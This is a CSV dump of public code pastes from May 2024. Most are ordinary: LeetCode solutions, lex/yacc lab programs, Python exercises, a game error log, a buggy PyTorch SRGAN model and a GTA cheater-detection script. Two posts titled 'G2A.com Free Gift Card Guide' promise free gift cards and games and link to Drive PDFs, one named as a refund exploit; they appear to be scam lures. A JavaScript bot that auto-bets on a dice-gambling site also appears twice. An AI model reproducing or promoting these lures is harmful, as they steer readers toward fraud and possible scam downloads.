id,title,username,language,date,content
EjuXGaXW,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 💰,ssss50w,GetText,Wednesday 1st of May 2024 06:37:49 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
01 May 2024"
DBHhqrv1,farts back snowybot no brainfarts,coinwalk,JavaScript,Wednesday 1st of May 2024 06:36:53 AM CDT,"var olsenest = parseFloat(document.getElementById('pct_balance').value);
var dividedby = 1000;
var monkey = Number((olsenest/dividedby).toFixed(8));
var dust = (monkey/2);
var bolux = monkey;
var tens = (monkey*10);
var hundreds = (monkey*200);
var sevens = (monkey*6.9);
var eights = (monkey*7.9);
var olsen = 0;
var chickendinner = (olsenest*24);
var belance = olsenest;
var solvert = olsenest;
var silvery = ((Math.floor(olsenest/tens))*tens);
var bob = false;
var fart = 4;
 
function go(){
belance = document.getElementById('pct_balance').value;
var dog = Number((belance-olsenest).toFixed(8));
console.log(""profit"");
console.log(dog);
if ((belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))&&(belance!=olsen)){
    bolux = bolux*2;
    olsen = parseFloat(belance);
}
if (((((belance-solvert)-hundreds)-(bolux*2))<=0)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = monkey;
    olsen = 0;
    fart = 0;
    solvert = parseFloat(belance);
}
if ((belance>=(silvery+(tens*fart)))&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = monkey;
    olsen = 0;
    fart = 4;
    solvert = parseFloat(belance);
silvery = ((Math.floor(belance/tens))*tens);
}
if (belance>=chickendinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((bolux*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1000);
}
go();
"
0zaaPJT5,Untitled,RealBUZZARD,Lua,Wednesday 1st of May 2024 06:35:56 AM CDT,"menu.toggle_loop(menu.my_root(), 'Detect cheaters', {''}, 'Detect cheaters who\'re using ""Weapon Damage Multiplier"".',
    function()
        util.yield(1000)
        local cheaters = {}

        for _, pid in pairs(players.list()) do
            local player = {pid = pid}
            if
                PLAYER.IS_PLAYER_PLAYING(player.pid)
                and NETWORK.NETWORK_IS_PLAYER_CONNECTED(player.pid)
                and NETWORK.NETWORK_IS_PLAYER_ACTIVE(player.pid)
                and players.are_stats_ready(player.pid)
                and not NETWORK.IS_PLAYER_IN_CUTSCENE(player.pid)
                and not NETWORK.NETWORK_IS_PLAYER_FADING(player.pid)
                and not players.is_in_interior(player.pid)
            then
                player.weapon_damage_modifier = players.get_weapon_damage_modifier(player.pid)

                if player.weapon_damage_modifier > default_max_weapon_damage_modifier then
                    player.name = players.get_name(player.pid)
                    player.ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player.pid)

                    player.org_type = players.get_org_type(player.pid)
                    if player.org_type == -1 then
                        player.org_type = ""None""
                    elseif player.org_type == 0 then
                        player.org_type = ""CEO""
                    elseif player.org_type == 1 then
                        player.org_type = ""MC""
                    end

                    if PED.IS_PED_IN_ANY_VEHICLE(player.ped, false) then
                        player.is_in_vehicle = true
                        player.vehicle = PED.GET_VEHICLE_PED_IS_IN(player.ped, false)
                        player.VehicleHash = ENTITY.GET_ENTITY_MODEL(player.vehicle)
                        player.vehicleModel = util.reverse_joaat(player.VehicleHash)
                    else
                        player.is_in_vehicle = false
                        player.vehicle = nil
                        player.VehicleHash = nil
                        player.vehicleModel = nil
                    end

                    if player.org_type == ""CEO"" then
                        if player.weapon_damage_modifier > default_max_bst_weapon_damage_modifier then
                            cheaters[player.pid] = {
                                weapon_damage_modifier = player.weapon_damage_modifier,
                                organisation_type = player.org_type,
                                name = player.name
                            }
                        end
                    else
                        if player.weapon_damage_modifier > default_max_vehicle_weapon_damage_modifier then
                            if player.org_type == ""MC"" then
                                if
                                    (player.vehicleModel ~= ""vortex"")
                                    and (player.vehicleModel ~= ""oppressor2"")
                                    and (player.vehicleModel ~= ""oppressor"")
                                then
                                    cheaters[player.pid] = {
                                        weapon_damage_modifier = player.weapon_damage_modifier,
                                        organisation_type = player.org_type,
                                        name = player.name
                                    }
                                end
                            else
                                if
                                    (player.vehicleModel ~= ""oppressor2"")
                                    and (player.vehicleModel ~= ""oppressor"")
                                then
                                    cheaters[player.pid] = {
                                        weapon_damage_modifier = player.weapon_damage_modifier,
                                        organisation_type = player.org_type,
                                        name = player.name
                                    }
                                end
                            end
                        end
                    end
                end
            end
        end

        for pid, player in pairs(cheaters) do
            print(""Player "" .. player.name .. "" is detected as a cheater! Weapon Damage Modifier: "" .. player.weapon_damage_modifier .. "", Organisation: "" .. player.organisation_type)
        end
end)"
DFQ8DZVf,String Compression,jayati,C++,Wednesday 1st of May 2024 06:33:34 AM CDT,"class Solution {
public:
    int compress(vector<char>& chars) {
        int i=0,j=0;

        while(i<chars.size())
        {
            int count=1;
            while(i+count<chars.size() && chars[i+count]==chars[i])
            {
                count++;
            }
            chars[j++]=chars[i];
            if(count>1)
            {
                for(char c:to_string(count))
                {
                    chars[j++]=c;
                }
            }
            i+=count;
        }
        return j;
    }
};"
RWzK3WM8,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Wednesday 1st of May 2024 06:08:55 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_814269.pdf

Working as of:
01 May 2024"
3YA8ndDL,Untitled,nKerkhofs,Lua,Wednesday 1st of May 2024 06:07:16 AM CDT,"3x FrameXML/StaticPopup.lua:1068: attempt to call global 'ComplainInboxItem' (a nil value)
[string ""@FrameXML/StaticPopup.lua""]:1068: in function `OnAccept'
[string ""@FrameXML/StaticPopup.lua""]:5337: in function `StaticPopup_OnClick'
[string ""*StaticPopup.xml:24_OnClick""]:1: in function <[string ""*StaticPopup.xml:24_OnClick""]:1>

Locals:
self = StaticPopup1 {
 0 = <userdata>
 hideOnEscape = 1
 SubText = FontString {
 }
 ItemFrame = StaticPopup1ItemFrame {
 }
 Border = Frame {
 }
 Center = Texture {
 }
 OnBackdropSizeChanged = <function> defined @SharedXML/Backdrop.lua:182
 DarkOverlay = Frame {
 }
 TopLeftCorner = Texture {
 }
 DropDownControl = Frame {
 }
 icon = StaticPopup1AlertIcon {
 }
 AlertIcon = StaticPopup1AlertIcon {
 }
 moneyInputFrame = StaticPopup1MoneyInputFrame {
 }
 moneyFrame = StaticPopup1MoneyFrame {
 }
 BottomEdge = Texture {
 }
 GetBackdropColor = <function> defined @SharedXML/Backdrop.lua:390
 text = StaticPopup1Text {
 }
 SetBackdrop = <function> defined @SharedXML/Backdrop.lua:329
 ClearBackdrop = <function> defined @SharedXML/Backdrop.lua:282
 GetBackdropBorderColor = <function> defined @SharedXML/Backdrop.lua:409
 extraButton = StaticPopup1ExtraButton {
 }
 RightEdge = Texture {
 }
 template = ""Transparent""
 maxHeightSoFar = 82.999990
 CoverFrame = Frame {
 }
 BottomRightCorner = Texture {
 }
 SetBorderBlendMode = <function> defined @SharedXML/Backdrop.lua:266
 BottomLeftCorner = Texture {
 }
 Spinner = Frame {
 }
 itemFrame = StaticPopup1ItemFrame {
 }
 PixelSnapDisabled = true
 TopRightCorner = Texture {
 }
 data = 1
 button3 = StaticPopup1Button3 {
 }
 backdropInfo = <table> {
 }
 button4 = StaticPopup1Button4 {
 }
 SetupTextureCoordinates = <function> defined @SharedXML/Backdrop.lua:214
 extraFrame = StaticPopup1ExtraFrame {
 }
 HasBackdropInfo = <function> defined @SharedXML/Backdrop.lua:278
 GetEdgeSize = <function> defined @SharedXML/Backdrop.lua:188
 numButtons = 2
 maxWidthSoFar = 320
 button2 = StaticPopup1Button2 {
 }
 onCloseCallback = <function> defined @FrameXML/StaticPopup.lua:5272
 GetBackdrop = <function> defined @SharedXML/Backdrop.lua:347
 button1 = StaticPopup1Button1 {
 }
 TopEdge = Texture {
 }
 OnBackdropLoaded = <function> defined @SharedXML/Backdrop.lua:152
 ApplyBackdrop = <function> defined @SharedXML/Backdrop.lua:294
 editBox = StaticPopup1EditBox {
 }
 timeleft = 0
 CloseButton = StaticPopup1CloseButton {
 }
 SetBackdropBorderColor = <function> defined @SharedXML/Backdrop.lua:422
 Separator = Texture {
 }
 SetupPieceVisuals = <function> defined @SharedXML/Backdrop.lua:246
 SetBackdropColor = <function> defined @SharedXML/Backdrop.lua:399
 LeftEdge = Texture {
 }
 which = ""CONFIRM_REPORT_SPAM_MAIL""
}
index = 1
(*temporary) = nil
(*temporary) = 1
(*temporary) = ""attempt to call global 'ComplainInboxItem' (a nil value)""
"
3Yv9VFCV,Increasing Triplet Subsequence,jayati,C++,Wednesday 1st of May 2024 06:03:33 AM CDT,"class Solution {
public:
    bool increasingTriplet(vector<int>& nums) {
        int first_s=INT_MAX;
        int second_s=INT_MAX;
        for(int i=0;i<nums.size();i++)
        {
            if(nums[i]<=first_s)
            {
                first_s=nums[i];
            }
            else if(nums[i]<=second_s)
            {
                second_s=nums[i];
            }
            else
            {
                return true;
            }
        }
        return false;
        
    }
};"
WaZBEpW4,data913,TestGuy1,JSON,Wednesday 1st of May 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'c60a2b3e730b65c433ca4ecb5b83eac2932ccf2789f018c6a994bfe64210604998cc16e531981d4e0e0a8290289b975e9c5db72c1c1dbc257d60644eb18ca75e13c51708d050009ff40e60dee96e73357081a83debffed0901d4df730f61c3c7fe5b6ca8ed855fd5568491a50d40132aba4888017f7cf3a6a8e7eab7b5d7f0c8',
  otherdata: [
    'f9e63a6e60f7c99618970d402cfb2668',
    '712e9c08a21751787eeaf05a169a3f95',
    '6aad44060718d427c7bcce58a67e624d',
    '090bee0d7c6933851d7b537034fe63f8',
    'b17d23eead643b17877a9e49a8a83af1',
    '1ed84a69faf50e2dda0cfcf3132d27da',
    '296d1040bd24af55d615574ab72f2bd8',
    'c1abf9f60071ec2376ac4aa7f1c82686'
  ]
}"
hfCrGgt5,turtle_startup,mathiaas,Lua,Wednesday 1st of May 2024 05:54:06 AM CDT,"dofile(""turtle_bot"")

local scriptName = ""startup""

local t = TurtleBot.new(scriptName, ""North"")
t:connect()
t.status = STATUS.IDLE
t:updateData()"
TxGyQZBu,Untitled,Farz0l1x,Python,Wednesday 1st of May 2024 05:31:45 AM CDT,"file = open('4.txt')
D, P = map(int, file.readline().split())
a = []
for i in range(D):
    st, mana = map(int, file.readline().split())
    if mana > 1:
        a.append((st, st + mana // 2, mana // 2))
a.sort()
kot = [0] * P
count = 0
maxzel = 0
for i in range(len(a)):
    st, end, zel = a[i]
    for j in range(P):
        if kot[j] <= st:
            kot[j] = end if kot[j] == 0 else end + 2
            if kot[j] > 1440:
                zel -= kot[j] - 1440
            count += zel
            maxzel = max(maxzel, zel)
            break
print(count, maxzel)"
JcV2RnDc,Untitled,Farz0l1x,Python,Wednesday 1st of May 2024 05:12:18 AM CDT,"ile = open('3.txt')
B, N = map(int, file.readline().split())
a = []
for i in range(N):
    st, r = map(int, file.readline().split())
    a.append((st, st + r, r))
###################################### 
a.sort(key = lambda a: a[0])
######################################
bank = [0] * B
bank_count = [0] * B
last = 0
for i in range(N):
    st, end, r = a[i]
    for j in range(B):
        if bank[j] <= st:
            bank[j] = end
            if st <= 1440:
                bank_count[j] += 1
                last = st
            break
    else:
        m = min(bank)
        for j in range(B):
            if bank[j] == m:
                if bank[j] <= 1440:
                    bank_count[j] += 1
                    last = bank[j]
                bank[j] = bank[j] + r
                break
print(max(bank_count), last)"
rEmRkmBf,farts back snowybot no brainfarts,coinwalk,JavaScript,Wednesday 1st of May 2024 05:12:05 AM CDT,"var olsenest = parseFloat(document.getElementById('pct_balance').value);
var dividedby = 1000;
var monkey = Number((olsenest/dividedby).toFixed(8));
var dust = (monkey/2);
var bolux = monkey;
var tens = (monkey*10);
var hundreds = (monkey*200);
var sevens = (monkey*6.9);
var eights = (monkey*7.9);
var olsen = 0;
var chickendinner = (olsenest*24);
var belance = olsenest;
var solvert = olsenest;
var silvery = ((Math.floor(olsenest/tens))*tens);
var bob = false;
var fart = 4;
 
function go(){
belance = document.getElementById('pct_balance').value;
var dog = Number((belance-olsenest).toFixed(8));
console.log(""profit"");
console.log(dog);
if ((belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))&&(belance!=olsen)){
    bolux = bolux*2;
    olsen = parseFloat(belance);
}
if (((((belance-solvert)-hundreds)-(bolux*2))<=0)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = monkey;
    olsen = 0;
    fart = 0;
    solvert = parseFloat(belance);
}
if ((((belance>=(silvery+(tens*fart)))&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = monkey;
    olsen = 0;
    fart = 4;
    solvert = parseFloat(belance);
silvery = ((Math.floor(belance/tens))*tens);
}
if (belance>=chickendinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((bolux*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1000);
}
go();
"
qk7tDQkq,SSDC,opurag,C,Wednesday 1st of May 2024 05:08:32 AM CDT,"
------------------------------------------------------------------------------------------------------------------------
//1
//1a:Program to count the number, words, spaces and lines in a given input file

%{
#include<stdio.h>
int c=0;
int w=0;
int s=0;
int l=0;
%}
%%
"" "" { s++; w++;}
[\n] {l++;w++;}
[\t\n] {w++;}
[^\t\n] {c++;}
%%
int yywrap()
{
return 1;
}
int main()
{
 yyin=fopen(""Info.txt"", ""r"");
 yylex();
 printf(""Characters = %d\nWords = %d\nSpaces = %d\nLines= %d\n"",c,w,s,l);
 return 0;
}

//op
lex 1a.l
cc lex.yy.c -ll
./a.out

//1b:Program to recognize and count the number of identifiers in a file

%{
#include<stdio.h>
int i=0;
%}
digit [0-9]
letter [a-z A-Z_]
%%
{letter}({letter}|{digit})* {i++;}
{digit}({letter}|{digit})* {i;}
%%
int main()
{
printf(""Enter the values:\n"");

yylex();
printf(""Number of identifiers = %d\n"", i);
return 0;
}

//op
lex 1b.l
cc lex.yy.c -ll
./a.out

// ctrl+d to end loop
------------------------------------------------------------------------------------------------------------------------
//2
//2a:Programs to count the numbers of comments lines in a given C program. Also eliminate them and copy the resulting program into separate file.

%{
#include<stdio.h>
int ml=0;
int sl=0;
%}

%%

""/*""[a-z A-Z 0-9 ' ' \t \n]*""*/"" ml++;
""//"".* sl++;

%%
int main()
{
yyin=fopen(""f1.txt"",""r"");
yyout=fopen(""f2.txt"",""w"");
yylex();
fclose(yyin);
fclose(yyout);
printf(""Number of single line comments =%d\n"",sl);
printf(""Number of multi line comments =%d\n"",ml);
}

//op
gedit f1.txt
lex 2a.l
cc lex.yy.c -ll
cat f2.txt


//2b: Program to recognize whether a given sentence is simple or compound.

%{
#include<stdio.h>
int c=0;
%}

%%
[a-zA-Z]*[ ](and|or|but|yet|so)[ ][a-zA-Z]* {c=1;}
.|[\n];

%%
int yywrap()
{
  return 1;
}

void main()
{
 printf(""enter the text\n"");
 yylex();
 if(c)
 {
  printf(""The given statement is compound\n"");
 }
 else
 {
  printf(""The given statement is simple\n"");
 }
}


//op
lex 2b.l
cc lex.yy.c -ll
./a.out

------------------------------------------------------------------------------------------------------------------------
//3
//3a: Program to count number of:
 //    i.+ve and -ve integers
 //    ii. +ve and -ve fractions

%{
#include<stdio.h>
int pi=0,ni=0,pf=0,nf=0;
%}
%%
[-][0-9]+ {ni++;}
[+]?[0-9]+ {pi++;}
[-][0-9]*\.[0-9]+ {nf++;}
[+]?[0-9]*\.[0-9]+ {pf++;}
%%

void main(int argc,char *argv[])
{
if(argc!=2)
{
printf(""usage :./a.out in.txt \n"");
exit(0);
}
yyin=fopen(argv[1],""r"");
yylex();
printf(""Number of positive integer %d\n"",pi);
printf(""Number of negative integer %d\n"",ni);
printf(""Number of positive fraction %d\n"",pf);
printf(""Number of negative fraction %d\n"",nf);
}
int yywrap(){
return 1;
}

//in.txt
12
-29
0
+8
-0.9

//op
lex 3a.l
cc lex.yy.c -ll
./a.out in.txt


//3b: Program to count the number of “scanf” and “printf” statements in a C program. Replace them with “readf” and “writef” statements respectively.

%{
#include<stdio.h>
int sf=0,pf=0;
%}
%%
""scanf"" {sf++; fprintf(yyout,""readf"");}
""printf"" {pf++; fprintf(yyout,""writef"");}
%%

int main()
{
yyin=fopen(""f1.c"",""r"");
yyout=fopen(""f2.c"",""w"");
yylex();
printf(""no of scanf =%d\n no of printf =%d\n"",sf,pf);
return 0;
}

//op
gedit f1.c
lex 3b.l
cc lex.yy.c -ll
./a.out
cat f2.c

------------------------------------------------------------------------------------------------------------------------
//4: Program to evaluate arithmetic expression involving operators +, -, *, /
//4.l
%{
#include ""y.tab.h""
extern yylval;
%}
%%
[0-9]+ {yylval=atoi(yytext);return num;}
[\+\-\*\/] {return yytext[0];}
[)] {return yytext[0];}
[(] {return yytext[0];}
. {;}
\n {return 0;}
%%

//4.y
%{
#include<stdio.h>
#include<stdlib.h>
%}
%name parse
%token num
%left'+''-'
%left'*''/'
%%
input:exp {printf(""%d\n"",$$);exit(0);}
exp:exp'+'exp{$$=$1+$3;}
|exp'-'exp{$$=$1-$3;}
|exp'*'exp{$$=$1*$3;}
|exp'/'exp{if($3==0){printf(""Divide by zero error\n "");exit(0);}
else
$$=$1/$3;}
|'('exp')'{$$=$2;}
|num{$$=$1;};
%%
int yyerror()
{
printf(""error"");
exit(0);
}
int main()
{
printf(""Enter an expression:\n"");
yyparse();
}
  
  
//op
lex 4.l
yacc -d 4.y
cc lex.yy.c y.tab.c -lfl
./a.out

------------------------------------------------------------------------------------------------------------------------
//5: Program to recognize a valid variable which starts with a letter, followed by any number of letter or digits
//p5.l
%{
#include ""y.tab.h""
%}
%%
[a-zA-z] return L;
[0-9] return D;

%%

//p5.y
%{
#include<stdio.h>
#include<stdlib.h>
%}
%name parse
%token L D

%%
var:L E {printf(""Valid Variable\n""); return 0;}
E:E L;
|E D;
| ;
%%

int main()
{
printf(""Type the variable\n"");
yyparse();
return 0;
}
int yyerror()
{
printf(""Invalid Variable\n"");
exit(0);
}

//op
lex p5.l
yacc -d p5.y
cc lex.yy.c y.tab.c -lfl
./a.out

------------------------------------------------------------------------------------------------------------------------
//6: Program to recognize the strings using the grammar (a^nb^n ; n>=0)
//p6.l
%{
#include ""y.tab.h""
%}
%%
a return A;
b return B;
. return yytext[0];
\n return yytext[0];
%%

//p6.y
%{
#include<stdio.h>
#include<stdlib.h>
%}
%name parse
%token A B

%%
Str:S '\n' {return 0;}
S:A S B;

| ;
%%

int main()
{
printf(""Type the string\n"");
if (!yyparse())
printf(""Valid String\n"");
return 0;
}
int yyerror()
{
printf(""Invalid String\n"");
exit(0);
}

//op
lex p6.l
yacc -d p6.y
cc lex.yy.c y.tab.c -lfl
./a.out
------------------------------------------------------------------------------------------------------------------------

//7: C program to implement Pass1 of Assembler

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void main() {
  char opcode[10], operand[10], label[10], code[10], mnemonic[3];
  int locctr, start, length;

  FILE *fp1, *fp2, *fp3, *fp4;

  fp1 = fopen(""input.txt"", ""r"");
  fp2 = fopen(""optab.txt"", ""r"");
  fp3 = fopen(""symtabl.txt"", ""w"");
  fp4 = fopen(""out.txt"", ""w"");

  fscanf(fp1, ""%s\t%s\t%s"", label, opcode, operand);

  if (strcmp(opcode, ""START"") == 0) {
    start = atoi(operand);
    locctr = start;
    fprintf(fp4, ""\t%s\t%s\t%s\n"", label, opcode, operand);
    fscanf(fp1, ""%s\t%s\t%s"", label, opcode, operand);
  } else
    locctr = 0;

  while (strcmp(opcode, ""END"") != 0) {
    fprintf(fp4, ""%d\t"", locctr);

    if (strcmp(label, ""**"") != 0) fprintf(fp3, ""%s\t%d\n"", label, locctr);
    fscanf(fp2, ""%s\t%s"", code, mnemonic);

    while (strcmp(code, ""END"") != 0) {
      if (strcmp(opcode, code) == 0) {
        locctr += 3;
        break;
      }
      fscanf(fp2, ""%s\t%s"", code, mnemonic);
    }
    if (strcmp(opcode, ""WORD"") == 0)
      locctr += 3;
    else if (strcmp(opcode, ""RESW"") == 0)
      locctr += (3 * (atoi(operand)));
    else if (strcmp(opcode, ""RESB"") == 0)
      locctr += atoi(operand);
    else if (strcmp(opcode, ""BYTE"") == 0)
      ++locctr;
    fprintf(fp4, ""%s\t%s\t%s\t\n"", label, opcode, operand);
    fscanf(fp1, ""%s\t%s\t%s"", label, opcode, operand);
  }
  fprintf(fp4, ""%d\t%s\t%s\t%s\n"", locctr, label, opcode, operand);
  length = locctr - start;
  printf(""The length of the code:%d\n"", length);

  fclose(fp1);
  fclose(fp2);

  fclose(fp3);
  fclose(fp4);
}

//1.Input.txt
**	START	2000
**	LDA	FIVE
**	STA	ALPHA
**	LDCH	CHARZ
**	STCH	C1
ALPHA	RESW	2
FIVE	WORD	5
CHARZ	BYTE	C'Z'
C1	RESB	1
**	END	**

//2.Optab.txt
START	*
LDA	03
STA	0f
LDCH	53
STCH	57
END	*

//op
gcc p7.c
./a.out
cat Symtabl.txt
cat Out.txt
------------------------------------------------------------------------------------------------------------------------

//8: C program to implement Absolute loader.

#include<stdio.h>
#include<stdlib.h>
#include<string.h>
void main() {
	FILE *fp;
	int i,l, j, staddrl;
	char name[10], line[50], namel[10], staddr[10];
	printf(""enter program name: "");
	scanf(""%s"", name);
	fp = fopen(""abssrc.txt"", ""r"");
	fscanf(fp, ""%s"", line);
	for(i=2, j=0; i<8, j<6; i++, j++) {
		namel[j] = line[i];
	}
	namel[i] = '\0';
	printf(""name from obj: %s\n"", namel);
	if(strcmp(name,namel) == 0) {
		do {
			fscanf(fp, ""%s"", line);
			if(line[0] == 'T') {
				for(i=2, j=0; i<8, j<6; i++, j++) {
					staddr[j] = line[i];
				}
				staddr[j] = '\0';
				staddrl = atoi(staddr);
				i=12;
				while(line[i] != '$') {
					if(line[i] != '^') {
						printf(""00%d\t%c%c\n"", staddrl, line[i], line[i+1]);
						staddrl++;
						i = i+2;
					} else {
						i++;
					}
				}
			} else if (line[0] == 'E') {
				break;
 
			}
		}while(!feof(fp));
		fclose(fp);
	}
}
 
 
 //abssrc.txt
H^00COPY^001000
T^001000^3C^001011^10121A^11222B$
T^002000^2E^101B2A^0C123A$
E^001000
(or)
H^SAMPLE^001000^0035
T^001000^0C^001003^071009$
T^002000^03^111111$
E^001000

//op
./a.out
00COPY (or) SAMPLE

------------------------------------------------------------------------------------------------------------------------
"
yDA8xvVB,Untitled,Farz0l1x,Python,Wednesday 1st of May 2024 05:07:21 AM CDT,"file = open('3.txt')
B, N = map(int, file.readline().split())
a = []
for i in range(N):
    st, r = map(int, file.readline().split())
    a.append((st, st + r, r))
a.sort()
bank = [0] * B
bank_count = [0] * B
last = 0
for i in range(N):
    st, end, r = a[i]
    for j in range(B):
        if bank[j] <= st:
            bank[j] = end
            if st <= 1440:
                bank_count[j] += 1
                last = st
            break
    else:
        m = min(bank)
        for j in range(B):
            if bank[j] == m:
                if bank[j] <= 1440:
                    bank_count[j] += 1
                    last = bank[j]
                bank[j] = bank[j] + r
                break
print(max(bank_count), last)"
26NsSCh5,Untitled,ChrisDunamis,Python,Wednesday 1st of May 2024 04:57:05 AM CDT,"import torch

from torch import nn

print(""torch Version:"", torch.__version__)


class ConvolutionalBlock(nn.Module):
    def __init__(self, input_channels, output_channels, discriminator=False, use_activation=True,
                 use_batch_normalization=True, **kwargs):

        super().__init__()

        self.use_activation = use_activation
        self.cnn = nn.Conv2d(input_channels, output_channels, **kwargs, bias=not use_batch_normalization)
        self.use_batch_normalization = nn.BatchNorm2d(output_channels) if use_batch_normalization else nn.Identity()
        self.use_activation = (
            nn.LeakyReLU(0.2, inplace=True) if discriminator else nn.PReLU(num_parameters=output_channels)
        )

    def forward(self, x):
        return self.use_activation(self.use_batch_normalization(self.cnn(x)) if self.use_activation else 
                                   self.use_batch_normalization(self.cnn(x)))
    
    
class UpsampleBlock(nn.Module):
    def __init__(self, input_channels, scale_factor):

        super().__init__()

        self.convolutional_layer =  nn.Conv2d(input_channels, (input_channels * scale_factor) ** 2, 2, 3, 1, 1)
        # Where, Input Channels * 4, Height, Width --> Input Channels, Height * 2, Width * 2:
        self.pixel_shuffle = nn.PixelShuffle(scale_factor)
        self.activation = nn.PReLU(num_parameters=input_channels)
    
    def forward(self, x):
        return self.activate(self.pixel_shuffle(self.convolutional_layer(x)))
    
    
class ResidualBlock(nn.Module):
    def __init__(self, input_channels):

        super().__init__()

        self.block1 = ConvolutionalBlock(input_channels, input_channels, kernel_size=3, stride=1, padding=1)
        self.block2 = ConvolutionalBlock(input_channels, input_channels, kernel_size=3, stride=1, padding=1, 
                                         use_activation=False)
    
    def forward(self, x):
        output = self.block1(x)
        output = self.block2(output)

        return output + x
    
    
class Generator(nn.Module):
    def __init__(self, input_channels=3, number_of_channels=64, number_of_blocks=16):

        super().__init__()

        self.initialize = ConvolutionalBlock(input_channels, number_of_channels, kernel_size=9, stride=1, padding=4, 
                                             use_batch_normalization=False)
        self.residual_layers = nn.Sequential(*[ResidualBlock(number_of_channels) for _ in range(number_of_blocks)])
        self.convolutional_block = ConvolutionalBlock(input_channels, number_of_channels, kernel_size=9, stride=1, 
                                                      padding=4, use_activation=False)
        self.upsamples = nn.Sequential(UpsampleBlock(number_of_channels, 2), UpsampleBlock(number_of_channels, 2))
        self.final_layer = nn.Conv2d(number_of_channels, input_channels, kernel_size=9, stride=1, padding=4)
    
    def forward(self, x):
        initialise = self.initialize(x)
        x = self.residual_layers(initialise)
        x = self.convolutional_block(x) + initialise
        x = self.upsamples(x)

        return torch.tanh(self.final_layer(x))
    
    
class Discriminator(nn.Module):
    def __init__(self, input_channels=3, features=[64, 64, 128, 128, 256, 256, 512, 512]):
        
        super().__init__()

        blocks = []
        
        for idx, feature in enumerate(features):
            blocks.append(
                ConvolutionalBlock(
                    input_channels, feature, kernel_size=3, stride=1 + (idx % 2), padding=1, discriminator=True, 
                    use_activation=True, use_batch_normalization=False if idx == 0 else True
                )
            )
            input_channels = feature

        self.blocks = nn.Sequential(*blocks)
        self.classifier = nn.Sequential(
            nn.AdaptiveAvgPool2d((6, 6)), 
            nn.Flatten(), 
            nn.Linear((512 * 6 * 6), 1024), 
            nn.LeakyReLU(0.2, inplace=True), 
            nn.Linear(1024 * 1)
        )
    
    def forward(self, x):
        x = self.blocks(x)

        return self.classifier(x)
    
    
def test():
    low_resolution = 24

    with torch.cuda.amp.autocast():
        x = torch.randn(5, 3, low_resolution, low_resolution)
        generator = Generator()
        generator_output = generator(x)  # <--- The error points here
        discriminator = Discriminator()
        discriminator_output = discriminator(generator_output)

        print(""Generator Output Shape:     {}"".format(generator_output.shape) + ""\n"" + 
              ""Discriminator Output Shape: {}"".format(discriminator_output.shape))


test()"
d8ANSS4X,SgPokeMap Filter PvP,name8888less,JavaScript,Wednesday 1st of May 2024 04:52:28 AM CDT,"javascript:$.getScript(""https://cdn.jsdelivr.net/gh/name8888less/sgpokemap-addons@fdba83209631fdf67d850931094f49b1b9f576c4/filter_mons.min.js"", function(data, textStatus, jqxhr) {});"
7WNtGRK1,Untitled,Farz0l1x,Python,Wednesday 1st of May 2024 04:42:25 AM CDT,"file = open('2.txt')
N, L, M = map(int, file.readline().split())
a = []
for i in range(N):
    st, r, t = file.readline().split()
    a.append((int(st), int(st) + int(r), t))
a.sort()
park = [0] * (L + M)
bus = 0
left = 0
for i in range(N):
    st, end, t = a[i]
    if t == ""A"":
        for j in range(L + M):
            if park[j] <= st:
                park[j] = end
                break
        else:
            left += 1
    if t == 'B':
        for j in range(L, L + M):
            if park[j] <= st:
                park[j] = end
                bus += 1
                break
        else:
            left += 1
print(bus, left)"
Rivw9auv,Edit bars,SaNik74,C#,Wednesday 1st of May 2024 04:29:48 AM CDT,"internal class Program
{
    static void Main(string[] args)
    {
        string nameHealthBar = ""Health"";
        string nameArmorBar = ""Armor"";
        string nameStaminaBar = ""Stamina"";
        string nameAmmoBar = ""Ammo"";
        int percentHealth = 60;
        int percentArmor = 100;
        int percentStamina = 20;
        int percentAmmo = 80;

        EditBar(nameHealthBar, percentHealth, ConsoleColor.Red, 0, 0);
        EditBar(nameArmorBar, percentArmor, ConsoleColor.DarkYellow, 12, 0);
        EditBar(nameStaminaBar, percentStamina, ConsoleColor.DarkBlue, 0, 3);
        EditBar(nameAmmoBar, percentAmmo, ConsoleColor.DarkGray, 12, 3);
    }

    static void EditBar(string nameBar, int precentOccupancy, ConsoleColor color, int positionX, int positionY, int maxValue = 10)
    {
        int hundredPercent = 100;
        int startingLinePosition = 0;

        if (precentOccupancy > 100)
        {
            precentOccupancy = 100;
        }

        ConsoleColor defaultColour = Console.BackgroundColor;
        string bar = """";
        int occupancyValue = maxValue * precentOccupancy / hundredPercent;

        DrawBar(startingLinePosition, occupancyValue, ref bar);

        Console.SetCursorPosition(positionX, positionY);
        Console.Write('[');
        Console.BackgroundColor = color;
        Console.Write(bar);
        Console.BackgroundColor = defaultColour;
        bar = """";

        DrawBar(occupancyValue, maxValue, ref bar);

        Console.Write($""{bar}]"");
        Console.SetCursorPosition(positionX + 3, positionY + 1);
        Console.Write(nameBar);
    }

